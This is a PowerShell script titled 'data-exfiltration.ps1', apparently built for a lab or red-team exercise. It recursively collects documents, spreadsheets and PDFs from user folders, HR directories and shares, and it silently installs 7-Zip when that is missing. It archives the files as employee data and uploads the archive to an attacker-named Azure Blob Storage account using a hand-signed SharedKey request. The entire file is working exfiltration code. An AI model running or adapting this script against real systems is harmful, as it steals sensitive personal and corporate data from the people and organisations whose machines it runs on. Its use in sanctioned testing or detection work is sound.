$StorageAccount = "stolecompanydata123lab"                      
$StorageKey     = Read-Host "key"                       
$ContainerName  = "stolecompanydata"      
$BlobName       = "employ-data.zip"

$WorkDir     = "C:\ProgramData"
$StagingDir  = Join-Path $WorkDir "staging"
$BackupDir   = Join-Path $WorkDir "backup"
$LogFile     = Join-Path $WorkDir "logfile.log"
$ScriptName  = "data-exfiltration.ps1"

$CollectPaths = @(
    "$env:USERPROFILE\Documents",
    "$env:USERPROFILE\Desktop",
    "$env:USERPROFILE\Downloads",
    "C:\ProgramData\HR",
    "C:\Shares"
)
$CollectExtensions = @("*.csv", "*.xlsx", "*.xls", "*.docx", "*.doc", "*.pdf", "*.txt")


function Log-Message {
    param([string]$message, [string]$level = "INFO")
    $ts = Get-Date -Format "yyyy-MM-dd HH:mm:ss"
    Add-Content -Path $LogFile -Value "$ts [$level] [$ScriptName] $message"
}


if ([string]::IsNullOrWhiteSpace($StorageAccount) -or [string]::IsNullOrWhiteSpace($StorageKey)) {
    Write-Host "    Refusing to run against an empty destination."
    Log-Message "Aborted: storage destination not configured." "ERROR"
    return
}

Log-Message "Script Execution Started"
$TimeStamp = Get-Date -Format "yyyyMMddHHmmss"

foreach ($d in @($StagingDir, $BackupDir)) {
    if (-not (Test-Path $d)) { New-Item -ItemType Directory -Path $d -Force | Out-Null }
}

Log-Message "Collection started. Sweeping for sensitive documents."
$Collected = New-Object System.Collections.Generic.List[Object]
foreach ($path in $CollectPaths) {
    if (-not (Test-Path $path)) { continue }
    foreach ($ext in $CollectExtensions) {
        Get-ChildItem -Path $path -Filter $ext -Recurse -ErrorAction SilentlyContinue -File |
        Where-Object { $_.Length -lt 25MB } |
        ForEach-Object {
            try {
                $dest = Join-Path $StagingDir $_.Name
                Copy-Item -Path $_.FullName -Destination $dest -Force -ErrorAction Stop
                $Collected.Add([pscustomobject]@{
                    Source = $_.FullName
                    Size   = $_.Length
                    SHA256 = (Get-FileHash $_.FullName -Algorithm SHA256).Hash
                })
            } catch { Log-Message "Could not copy $($_.FullName): $_" "ERROR" }
        }
    }
}
Log-Message "Collection finished. $($Collected.Count) file(s) staged in $StagingDir"


$manifest = Join-Path $StagingDir "Manifest-$TimeStamp.csv"
$Collected | Export-Csv -Path $manifest -NoTypeInformation -Encoding UTF8
Log-Message "Wrote exfil manifest: $manifest"


$sevenzip = "C:\Program Files\7-Zip\7z.exe"
if (-not (Test-Path $sevenzip)) {
    try {
        $installer = Join-Path $WorkDir "7z-installer.exe"
        Invoke-WebRequest -Uri "https://www.7-zip.org/a/7z2408-x64.exe" -OutFile $installer -UseBasicParsing
        Log-Message "Downloaded 7-Zip installer to $installer"
        Start-Process $installer -ArgumentList "/S" -Wait
        Log-Message "Installed 7-Zip silently."
        Start-Sleep -Seconds 5
    } catch { Log-Message "7-Zip download/installation failed: $_" "ERROR" }
}


$zipPath = Join-Path $WorkDir "employee-data-$TimeStamp.zip"
try {
    if (Test-Path $sevenzip) {
        & $sevenzip a $zipPath "$StagingDir\*" | Out-Null
    } else {
        Compress-Archive -Path "$StagingDir\*" -DestinationPath $zipPath -Force
    }
    Log-Message "Archived staged data to $zipPath"
} catch { Log-Message "Archiving failed: $_" "ERROR" }

try {
    $bytes         = [System.IO.File]::ReadAllBytes($zipPath)
    $contentLength = $bytes.Length
    $dateString    = [DateTime]::UtcNow.ToString("R")
    $version       = "2021-08-06"
    $contentType   = "application/octet-stream"
    $blobType      = "BlockBlob"
    $canonicalizedHeaders  = "x-ms-blob-type:$blobType`nx-ms-date:$dateString`nx-ms-version:$version"
    $canonicalizedResource = "/$StorageAccount/$ContainerName/$BlobName"
    $stringToSign = "PUT`n`n`n$contentLength`n`n$contentType`n`n`n`n`n`n`n$canonicalizedHeaders`n$canonicalizedResource"
    $hmac = New-Object System.Security.Cryptography.HMACSHA256
    $hmac.Key = [Convert]::FromBase64String($StorageKey)
    $signature = [Convert]::ToBase64String($hmac.ComputeHash([Text.Encoding]::UTF8.GetBytes($stringToSign)))
    $headers = @{
        "x-ms-date"      = $dateString
        "x-ms-version"   = $version
        "Authorization"  = "SharedKey $($StorageAccount):$signature"
        "x-ms-blob-type" = $blobType
        "Content-Length" = $contentLength
        "Content-Type"   = $contentType
    }
    $blobUrl = "https://$StorageAccount.blob.core.windows.net/$ContainerName/$BlobName"
    Invoke-WebRequest -Uri $blobUrl -Method Put -Headers $headers -InFile $zipPath -UseBasicParsing | Out-Null
    Log-Message "Uploaded archive to Azure Blob Storage: $blobUrl"   
} catch {
    Log-Message "Exfil upload failed: $_" "ERROR"
}


try {
    Move-Item -Path $zipPath  -Destination $BackupDir -Force -ErrorAction SilentlyContinue
    Move-Item -Path $manifest -Destination $BackupDir -Force -ErrorAction SilentlyContinue
    Log-Message "Moved archive + manifest to $BackupDir"
} catch { Log-Message "Housekeeping move failed: $_" "ERROR" }

Log-Message "Script execution completed successfully."
Write-Host "Done. Collected: $($Collected.Count) files." -ForegroundColor Green